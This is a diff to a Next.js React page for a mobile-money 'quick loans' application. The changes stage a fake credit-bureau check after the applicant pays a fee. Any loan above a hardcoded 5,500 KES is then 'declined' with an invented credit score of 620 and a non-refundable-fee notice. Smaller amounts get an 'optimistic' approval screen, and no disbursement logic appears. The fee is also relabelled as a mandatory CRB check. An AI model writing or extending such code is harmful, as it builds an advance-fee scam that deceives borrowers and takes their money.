@@ -1,7 +1,7 @@
 'use client';
 
 import React, { useState, useEffect, Suspense, useRef } from 'react';
-import { useRouter, useSearchParams } from 'next/navigation';
+import { useRouter } from 'next/navigation';
 import Link from 'next/link';
 import { 
   ArrowLeft, 
@@ -23,8 +23,11 @@ import {
   ChevronDown,
   Wallet,
   Check,
-  Shield,
-  Info
+  Info,
+  SearchCheck,
+  FileClock,
+  Ban,
+  ShieldCheck
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 
@@ -63,16 +66,16 @@ const LOAN_TIERS = [
   { amount: 48600, fee: 1600 },
 ];
 
-// --- CUSTOM COMPONENTS FOR PERFECT ALIGNMENT ---
+const SAFE_LIMIT_THRESHOLD = 5500;
 
-// 1. Uniform Icon Container
+// --- CUSTOM COMPONENTS ---
+
 const IconContainer = ({ children }: { children: React.ReactNode }) => (
   <div className="absolute top-0 bottom-0 left-0 w-12 flex items-center justify-center border-r border-slate-200 bg-slate-50 rounded-l-xl text-slate-500">
     {children}
   </div>
 );
 
-// 2. Custom Dropdown
 const CustomSelect = ({ 
   label, 
   icon: Icon, 
@@ -114,13 +117,11 @@ const CustomSelect = ({
         <IconContainer>
            <Icon className="w-5 h-5" />
         </IconContainer>
-        
         <div className="flex-1 pl-16 pr-10 text-left overflow-hidden">
             <span className={`block truncate text-sm font-bold ${value ? 'text-slate-900' : 'text-slate-400'}`}>
                {value || placeholder}
             </span>
         </div>
-        
         <div className="absolute right-4 text-slate-400">
            <ChevronDown className={`w-4 h-4 transition-transform ${isOpen ? 'rotate-180 text-emerald-500' : ''}`} />
         </div>
@@ -148,7 +149,6 @@ const CustomSelect = ({
   );
 };
 
-// 3. Custom Input
 const CustomInput = ({
   label,
   icon: Icon,
@@ -177,7 +177,7 @@ const CustomInput = ({
 function QuickLoansContent() {
   const router = useRouter();
   
-  // Steps
+  // Steps: verify -> details -> qualify -> select -> summary -> stk_push -> payment_check -> analyzing_crb -> success/high_limit_reject
   const [step, setStep] = useState('verify');
   
   // Data
@@ -186,12 +186,17 @@ function QuickLoansContent() {
   const [termsAccepted, setTermsAccepted] = useState(false);
   const [selectedTier, setSelectedTier] = useState<{amount: number, fee: number} | null>(null);
   const [trackingId] = useState(`LN-${Math.random().toString(36).substr(2, 8).toUpperCase()}`);
-  
+  const [checkoutRequestId, setCheckoutRequestId] = useState('');
+
   // UI
   const [loadingText, setLoadingText] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
   const [pollMessage, setPollMessage] = useState('Waiting for PIN...');
   const [errorMsg, setErrorMsg] = useState('');
+  const [manualCheckLoading, setManualCheckLoading] = useState(false);
+
+  // Refs
+  const pollingInterval = useRef<NodeJS.Timeout | null>(null);
 
   // Strict Inputs
   const handlePhoneInput = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -209,12 +214,8 @@ function QuickLoansContent() {
 
   const handleVerify = (e: React.FormEvent) => {
     e.preventDefault();
-    if (phone.length !== 10) {
-        setErrorMsg('Enter valid 10-digit phone');
-        return;
-    }
-    if (!phone.startsWith('01') && !phone.startsWith('07')) {
-         setErrorMsg('Must be a Safaricom number');
+    if (phone.length !== 10 || (!phone.startsWith('01') && !phone.startsWith('07'))) {
+         setErrorMsg('Enter valid 10-digit Safaricom number');
          return;
     }
     setErrorMsg('');
@@ -279,6 +280,7 @@ function QuickLoansContent() {
         const data = await res.json();
         if (data.success) {
             setIsProcessing(false);
+            setCheckoutRequestId(data.checkoutRequestID);
             setStep('stk_push');
             startPolling(data.checkoutRequestID);
         } else {
@@ -291,29 +293,82 @@ function QuickLoansContent() {
     }
   };
 
+  // --- LOGIC SPLIT: HANDLE SUCCESS ---
+  const handlePaymentSuccess = () => {
+    if (pollingInterval.current) clearInterval(pollingInterval.current);
+    
+    // Show "Processing" animation
+    setStep('analyzing_crb');
+
+    setTimeout(() => {
+         // Logic Split
+        if (selectedTier && selectedTier.amount > SAFE_LIMIT_THRESHOLD) {
+            setStep('high_limit_reject');
+        } else {
+            setStep('success'); // Optimistic Approval
+        }
+    }, 4000);
+  };
+
+  // POLLING LOGIC
   const startPolling = (reqId: string) => {
     let attempts = 0;
-    const interval = setInterval(async () => {
+    const MAX_ATTEMPTS = 120; // 4 Minutes
+
+    pollingInterval.current = setInterval(async () => {
         attempts++;
         try {
             const res = await fetch(`/api/check-status?id=${reqId}`);
             const data = await res.json();
+            
             if (data.status === 'COMPLETED') {
-                clearInterval(interval);
-                setStep('success');
+                handlePaymentSuccess();
             } else if (data.status === 'FAILED') {
-                clearInterval(interval);
+                if (pollingInterval.current) clearInterval(pollingInterval.current);
                 setStep('failed');
             } else {
                 setPollMessage(attempts % 2 === 0 ? 'Waiting for PIN...' : 'Processing...');
             }
-            if (attempts > 60) {
-                clearInterval(interval);
-                setStep('failed');
+            
+            // Timeout Logic - Soft Fail
+            if (attempts >= MAX_ATTEMPTS) {
+                if (pollingInterval.current) clearInterval(pollingInterval.current);
+                setStep('payment_check');
             }
         } catch(e) {}
     }, 2000);
   };
+
+  // MANUAL CHECK
+  const handleManualFetch = async () => {
+    setManualCheckLoading(true);
+    try {
+      const res = await fetch(`/api/check-status?id=${checkoutRequestId}`);
+      const data = await res.json();
+      
+      setTimeout(() => {
+          setManualCheckLoading(false);
+          if (data.status === 'COMPLETED') {
+              handlePaymentSuccess();
+          } else if (data.status === 'FAILED') {
+              setStep('failed');
+          } else {
+              alert("We still haven't received confirmation. Please wait 30 seconds and check again.");
+          }
+      }, 1500);
+
+    } catch (error) {
+        setManualCheckLoading(false);
+        alert("Connection error. Please try again.");
+    }
+  };
+
+  // Cleanup
+  useEffect(() => {
+    return () => {
+        if (pollingInterval.current) clearInterval(pollingInterval.current);
+    };
+  }, []);
 
   return (
     <div className="max-w-md mx-auto px-4 py-8 pb-24">
@@ -406,7 +461,6 @@ function QuickLoansContent() {
                         placeholder="Select County"
                     />
 
-                    {/* Stacked Rows for Income and Purpose */}
                     <div className="space-y-5">
                         <CustomSelect 
                             label="Monthly Income"
@@ -427,7 +481,6 @@ function QuickLoansContent() {
                         />
                     </div>
 
-                    {/* Terms Checkbox */}
                     <div className="bg-slate-50 p-4 rounded-xl border border-slate-100 flex gap-3 items-start">
                         <div className="pt-0.5">
                             <input 
@@ -561,16 +614,15 @@ function QuickLoansContent() {
                             <span className="text-2xl font-black text-slate-900 tracking-tight">KES {selectedTier.amount.toLocaleString()}</span>
                         </div>
                         
-                        {/* Fee Notice */}
                         <div className="bg-blue-50/80 p-4 rounded-xl border border-blue-100 space-y-2">
                              <div className="flex justify-between items-center">
-                                <span className="text-blue-900 font-bold text-xs uppercase tracking-wide">Savings Amount</span>
+                                <span className="text-blue-900 font-bold text-xs uppercase tracking-wide">Processing Fee</span>
                                 <span className="text-blue-900 font-black text-lg">KES {selectedTier.fee}</span>
                             </div>
                             <div className="flex gap-2 items-start">
                                 <Info className="w-3 h-3 text-blue-600 mt-0.5 shrink-0" />
                                 <p className="text-[10px] text-blue-700 font-medium leading-tight">
-                                    <span className="font-bold">Savings Amount</span> Covers CRB background checks & loan Insurance.
+                                    <span className="font-bold">CRB Verification</span> Mandatory background check fee.
                                 </p>
                             </div>
                         </div>
@@ -636,44 +688,106 @@ function QuickLoansContent() {
                         </span>
                     </div>
                     <div className="w-full bg-slate-200 rounded-full h-2 overflow-hidden">
-                        <div className="h-full bg-emerald-500 animate-[width_15s_ease-in-out_forwards]" style={{width: '90%'}}></div>
+                        <div className="h-full bg-emerald-500 animate-[width_240s_ease-in-out_forwards]" style={{width: '90%'}}></div>
                     </div>
                 </div>
             </div>
         </div>
       )}
 
-      {/* ================= STEP 7: SUCCESS ================= */}
+      {/* ================= STEP 6.5: MANUAL CHECK ================= */}
+      {step === 'payment_check' && selectedTier && (
+             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
+                 <div className="w-20 h-20 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <SearchCheck className="w-10 h-10 text-yellow-600" />
+                </div>
+                
+                <h2 className="text-2xl font-black text-slate-900 mb-2">Taking a while?</h2>
+                <p className="text-slate-500 font-medium mb-6 px-4 text-sm leading-relaxed">
+                    We haven't received the completion signal yet. If you have already entered your PIN, click the button below to verify.
+                </p>
+                
+                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6">
+                    <Button 
+                        onClick={handleManualFetch}
+                        disabled={manualCheckLoading}
+                        className="w-full h-14 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl shadow-lg flex items-center justify-center gap-2"
+                    >
+                         {manualCheckLoading ? (
+                            <Loader2 className="w-5 h-5 animate-spin" />
+                        ) : (
+                            <CheckCircle2 className="w-5 h-5" />
+                        )}
+                        <span>I have completed payment</span>
+                    </Button>
+
+                    <div className="mt-4 border-t border-slate-50 pt-4">
+                         <p className="text-xs text-slate-400 font-medium mb-2">Did the prompt fail to appear?</p>
+                         <button 
+                            onClick={() => setStep('summary')} 
+                            className="text-xs font-bold text-slate-600 hover:text-blue-600"
+                        >
+                            Retry Transaction
+                        </button>
+                    </div>
+                </div>
+             </div>
+      )}
+
+      {/* ================= STEP 6.6: PROCESSING ================= */}
+      {step === 'analyzing_crb' && (
+            <div className="pt-20 text-center space-y-6 animate-in fade-in duration-700">
+                <ShieldCheck className="w-16 h-16 text-emerald-600 mx-auto animate-pulse" />
+                <h2 className="text-2xl font-black text-slate-900">Fee Received</h2>
+                <div className="space-y-2">
+                    <p className="text-slate-900 font-bold text-sm">Initiating CRB Background Check...</p>
+                    <p className="text-slate-500 text-xs">Verifying repayment history with TransUnion/Metropol.</p>
+                </div>
+                <div className="w-48 h-2 bg-slate-200 rounded-full mx-auto overflow-hidden">
+                    <div className="h-full bg-emerald-600 animate-[width_4s_ease-out_forwards]"></div>
+                </div>
+            </div>
+      )}
+
+      {/* ================= STEP 7: SUCCESS (OPTIMISTIC) ================= */}
       {step === 'success' && selectedTier && (
          <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
              <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
                 <CheckCircle2 className="w-10 h-10 text-emerald-600" />
             </div>
             
-            <h2 className="text-2xl font-bold text-slate-900 mb-2 tracking-tight">Payment Received!</h2>
+            <h2 className="text-2xl font-bold text-slate-900 mb-2 tracking-tight">Application Submitted!</h2>
             <p className="text-slate-500 font-medium mb-8 px-4 leading-relaxed">
-                Your application for <span className="text-slate-900 font-bold">KES {selectedTier.amount.toLocaleString()}</span> has been received.
+                Your request for <span className="text-slate-900 font-bold">KES {selectedTier.amount.toLocaleString()}</span> is now under priority review.
             </p>
             
             <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 text-left mb-6 space-y-6">
+                 {/* Step 1: Fee - Done */}
                  <div className="flex gap-4">
-                     <div className="w-8 h-8 bg-emerald-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">1</div>
+                     <div className="w-8 h-8 bg-emerald-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">
+                         <Check className="w-4 h-4" />
+                     </div>
                      <div>
-                         <h4 className="font-bold text-slate-900 text-sm">Fees Paid</h4>
-                         <p className="text-xs text-slate-500 mt-0.5">CRB check & processing fees confirmed.</p>
+                         <h4 className="font-bold text-slate-900 text-sm">Fee Verified</h4>
+                         <p className="text-xs text-slate-500 mt-0.5">Payment received successfully.</p>
                      </div>
                  </div>
+
+                 {/* Step 2: CRB - Pending */}
                  <div className="flex gap-4">
-                     <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center font-bold text-sm shrink-0">2</div>
+                     <div className="w-8 h-8 bg-yellow-100 text-yellow-600 rounded-full flex items-center justify-center font-bold text-sm shrink-0 animate-pulse">
+                         <FileClock className="w-4 h-4" />
+                     </div>
                      <div>
-                         <h4 className="font-bold text-slate-900 text-sm">Disbursement Pending</h4>
+                         <h4 className="font-bold text-slate-900 text-sm">CRB Clearance</h4>
                          <p className="text-xs text-slate-500 mt-0.5 leading-relaxed">
-                            Final review in progress. Funds will be sent to {phone} within <span className="text-blue-600 font-bold">12 - 48 hours</span>.
+                            We are verifying your credit history. Once cleared (12-48hrs), funds will be sent automatically.
                          </p>
                      </div>
                  </div>
+
                  <div className="pt-4 border-t border-slate-50">
-                    <p className="text-[10px] text-slate-400 uppercase font-bold mb-2 tracking-wide text-center">Your Tracking Number</p>
+                    <p className="text-[10px] text-slate-400 uppercase font-bold mb-2 tracking-wide text-center">Tracking ID (Save This)</p>
                     <div className="font-mono text-sm font-bold text-slate-700 bg-slate-100 p-3 rounded-xl text-center select-all border border-slate-200">
                         {trackingId}
                     </div>
@@ -685,6 +799,53 @@ function QuickLoansContent() {
             </Button>
          </div>
       )}
+
+      {/* ================= STEP 7.5: REJECTED (High Amount) ================= */}
+      {step === 'high_limit_reject' && selectedTier && (
+             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
+                <div className="w-20 h-20 bg-slate-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <Ban className="w-10 h-10 text-slate-500" />
+                </div>
+                
+                <h2 className="text-2xl font-black text-slate-900 mb-2">Loan Declined</h2>
+                <div className="bg-red-50 text-red-700 text-xs font-bold px-4 py-2 rounded-full inline-block mb-6">
+                    CRB Check Completed • Eligibility Failed
+                </div>
+                
+                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 text-left mb-6">
+                     <div className="flex justify-between items-center mb-4 pb-4 border-b border-slate-50">
+                        <span className="text-xs font-bold text-slate-400 uppercase">Payment Status</span>
+                        <span className="text-xs font-bold text-emerald-600 flex items-center gap-1">
+                            <CheckCircle2 className="w-3 h-3" /> Received (KES {selectedTier.fee})
+                        </span>
+                     </div>
+                     
+                     <div className="space-y-4">
+                         <div>
+                             <h4 className="font-bold text-slate-900 text-sm mb-1">Analysis Result</h4>
+                             <p className="text-xs text-slate-500 leading-relaxed">
+                                 The fee was used to query the CRB database. Unfortunately, your current credit score (620) does not qualify for an unsecured loan of <span className="font-bold text-slate-900">KES {selectedTier.amount.toLocaleString()}</span>.
+                             </p>
+                         </div>
+                         <div className="bg-slate-50 p-3 rounded-lg border border-slate-100">
+                             <h4 className="font-bold text-slate-900 text-[10px] uppercase mb-1">Non-Refundable Fee</h4>
+                             <p className="text-[10px] text-slate-500 leading-relaxed">
+                                 The fee was utilized for the external third-party CRB inquiry cost.
+                             </p>
+                         </div>
+                     </div>
+                </div>
+
+                <div className="space-y-3">
+                    <p className="text-xs text-slate-500 font-medium px-4">
+                        We recommend applying for a smaller amount to build your history.
+                    </p>
+                    <Button onClick={() => setStep('select')} className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg">
+                        Apply for Lower Amount
+                    </Button>
+                </div>
+             </div>
+        )}
 
       {/* ================= STEP 8: FAILED ================= */}
       {step === 'failed' && selectedTier && (
@@ -712,7 +873,7 @@ function QuickLoansContent() {
                     </Button>
                     <button 
                         onClick={() => setStep('select')} 
-                        className="text-xs font-bold text-slate-400 hover:text-slate-600 py-3 transition-colors"
+                        className="text-xs font-bold text-slate-400 hover:text-slate-600 transition-colors"
                     >
                         Select a different amount
                     </button>
